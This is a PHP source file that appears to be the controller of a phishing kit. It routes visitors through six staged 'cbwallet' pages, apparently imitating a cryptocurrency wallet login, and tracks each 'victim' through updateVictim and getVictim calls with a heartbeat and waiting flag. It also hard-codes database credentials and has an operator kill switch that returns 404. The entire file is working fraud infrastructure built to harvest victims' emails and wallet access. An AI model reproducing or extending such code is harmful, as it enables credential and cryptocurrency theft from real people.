<?php

$host = 'localhost';
$dbname = 'support';
$username = 'phpmyadmin';
$password = 'haha123';

try {
    $pdo = new PDO( 'mysql:host=' . $host . ';dbname=' . $dbname, $username, $password );
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // Check site status
    $stmt = $pdo->query("SELECT `status` FROM `site_status` WHERE `id` = 1");
    $row = $stmt->fetch(PDO::FETCH_ASSOC);
    if ($row['status'] === 'off') {
        http_response_code(404);
        exit;
    }
} catch (PDOException $e) {
    echo "Error: " . $e->getMessage();
    exit;
}



if (isset($_GET['stage'])) {
    switch ($_GET['stage']) {
        case '1':
          include 'cbwallet1.php';
          break;
        case '2':
          include 'cbwallet2.php';
          break;
        case '3':
          include 'cbwallet3.php';
          break;
        case '4':
          include 'cbwallet4.php';
          break;
        case '5':
          include 'cbwallet5.php';
          break;
        case '6':
          include 'cbwallet6.php';
          break;
    }
} else {
}

require_once( realpath( dirname( __FILE__ ) . DIRECTORY_SEPARATOR . 'core' . DIRECTORY_SEPARATOR . 'functions.php' ) );

if ( validUser( $pdo ) ) {

  updateVictim( $pdo, $_SESSION[ 'id' ], [
    'is_waiting' => 0,
    'heartbeat' => 23 // seed
  ] );

  $id = $_SESSION[ 'id' ];
  $email = getVictim( $pdo, $id )[ 'username' ];

} else {

  header( 'location:login.php' );

}

?>